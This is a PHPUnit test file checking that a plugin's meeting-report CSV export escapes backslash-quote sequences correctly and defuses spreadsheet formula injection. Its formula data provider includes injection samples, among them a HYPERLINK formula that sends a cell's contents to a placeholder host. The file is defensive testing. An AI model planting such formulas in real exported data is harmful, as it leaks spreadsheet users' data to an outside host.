<?php

declare(strict_types=1);

namespace Amber\Tests\Unit\Admin\IntergroupMeetings;

use Amber\Admin\IntergroupMeetings\ReportsAdmin;
use PHPUnit\Framework\TestCase;
use ReflectionMethod;

/**
 * Covers the report CSV's escaping.
 *
 * streamCsv() cannot be driven from a unit test — it sends HTTP headers,
 * writes to php://output and calls exit — so its CSV writing was extracted
 * into writeCsvRow(), which these exercise. That means the real production
 * writer (and therefore the real CSV_ESCAPE) is under test rather than a copy
 * of the logic.
 *
 * The behaviour is a fixed bug: PHP's legacy escape does not double a quote
 * which follows a backslash, so a note containing \"quoted\" text was written
 * as "says \"hi\"" — which an RFC 4180 reader (Excel, Sheets) parses as
 * `says \hi\""`, ending the field early and mangling the rest of the row.
 *
 * @covers \Amber\Admin\IntergroupMeetings\ReportsAdmin
 */
class ReportsAdminCsvTest extends TestCase
{
    /** @var string[] */
    private array $tempFiles = [];

    protected function tearDown(): void
    {
        foreach ($this->tempFiles as $file) {
            if (file_exists($file)) {
                unlink($file);
            }
        }
        $this->tempFiles = [];
        parent::tearDown();
    }

    /**
     * The regression: a field containing a backslash before a quote must
     * survive being read back by a standard RFC 4180 reader, which is what
     * the spreadsheet application opening this download will be.
     *
     * @test
     */
    public function a_backslash_before_a_quote_survives_an_rfc4180_reader(): void
    {
        $row = ['Chair', 'says \\"hi\\"'];

        $this->assertSame($row, $this->writeThenReadBack($row));
    }

    /**
     * @test
     * @dataProvider awkwardValueProvider
     */
    public function values_survive_a_write_read_round_trip(string $value): void
    {
        $row = ['Chair', $value, 'Apologies'];

        $this->assertSame($row, $this->writeThenReadBack($row));
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function awkwardValueProvider(): array
    {
        return [
            'plain'                  => ['North'],
            'backslash before quote' => ['says \\"hi\\"'],
            'trailing backslash'     => ['ends with backslash\\'],
            'backslash mid-field'    => ['North\\South'],
            'embedded comma'         => ['Smith, John'],
            'embedded quote'         => ['said "yes"'],
            'embedded newline'       => ["line one\nline two"],
            'empty'                  => [''],
            'only a backslash'       => ['\\'],
            // 'leading equals' used to live here. It no longer round-trips
            // byte for byte, and deliberately so — see the formula tests
            // below, which assert the new behaviour outright rather than
            // leaving it as a hole in this provider.
        ];
    }

    /**
     * Report rows carry member and group names, positions and notes, none of
     * which this plugin authors. A value that a spreadsheet would evaluate is
     * written as text instead.
     *
     * This costs the byte-for-byte round trip for such values: the reader
     * sees the leading quote. That is the intended trade — the quote is
     * consumed by Excel and LibreOffice on open, and a report is read, not
     * re-imported.
     *
     * @test
     * @dataProvider formulaLeadProvider
     */
    public function a_value_a_spreadsheet_would_evaluate_is_written_as_text(string $value): void
    {
        $row = $this->writeThenReadBack(['Chair', $value, 'Apologies']);

        $this->assertSame("'" . $value, $row[1]);
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function formulaLeadProvider(): array
    {
        return [
            'equals'        => ['=1+1'],
            'plus'          => ['+1+1'],
            'minus'         => ['-1+1'],
            'at'            => ['@SUM(A1)'],
            'hyperlink'     => ['=HYPERLINK("//host/"&A1,"click")'],
            'tab'           => ["\t=1+1"],
            // A leading space does not stop the evaluation, so it must not
            // stop the defusing either.
            'space then eq' => [' =1+1'],
        ];
    }

    /**
     * @test
     */
    public function an_ordinary_value_is_left_alone(): void
    {
        $row = $this->writeThenReadBack(['Chair', 'North', 'Apologies']);

        $this->assertSame('North', $row[1]);
    }

    /**
     * A whole report must re-read row for row — the failure mode of the old
     * escape was a field running past its record boundary and consuming the
     * next row.
     *
     * @test
     */
    public function every_row_of_a_report_reads_back_intact(): void
    {
        $rows = [
            ['Name', 'Note'],
            ['Alice A.', 'says \\"hi\\"'],
            ['Bob B.', 'ends with backslash\\'],
            ['Carol C.', 'plain'],
        ];

        $path   = $this->tempPath();
        $handle = fopen($path, 'w');
        foreach ($rows as $row) {
            $this->writeCsvRow($handle, $row);
        }
        fclose($handle);

        $this->assertSame($rows, $this->readAllRfc4180($path));
    }

    // ── Helpers ─────────────────────────────────────────────────────────

    /**
     * @param array<int, string> $row
     * @return array<int, string|null>
     */
    private function writeThenReadBack(array $row): array
    {
        $path   = $this->tempPath();
        $handle = fopen($path, 'w');
        $this->writeCsvRow($handle, $row);
        fclose($handle);

        return $this->readAllRfc4180($path)[0];
    }

    /**
     * Write through ReportsAdmin's real writer.
     *
     * @param resource          $handle
     * @param array<int, mixed> $fields
     */
    private function writeCsvRow($handle, array $fields): void
    {
        (new ReflectionMethod(ReportsAdmin::class, 'writeCsvRow'))->invoke(null, $handle, $fields);
    }

    /**
     * Read the file the way Excel, Google Sheets and PHP 9 do: RFC 4180, with
     * no backslash escape. This is deliberately not ReportsAdmin's own reader
     * — the point is that what we hand the user opens correctly elsewhere.
     *
     * @return array<int, array<int, string|null>>
     */
    private function readAllRfc4180(string $path): array
    {
        $handle = fopen($path, 'r');
        $rows   = [];
        while (($row = fgetcsv($handle, 0, ',', '"', '')) !== false) {
            $rows[] = $row;
        }
        fclose($handle);

        return $rows;
    }

    private function tempPath(): string
    {
        $path = tempnam(sys_get_temp_dir(), 'amber_csv_') . '.csv';
        $this->tempFiles[] = $path;

        return $path;
    }
}
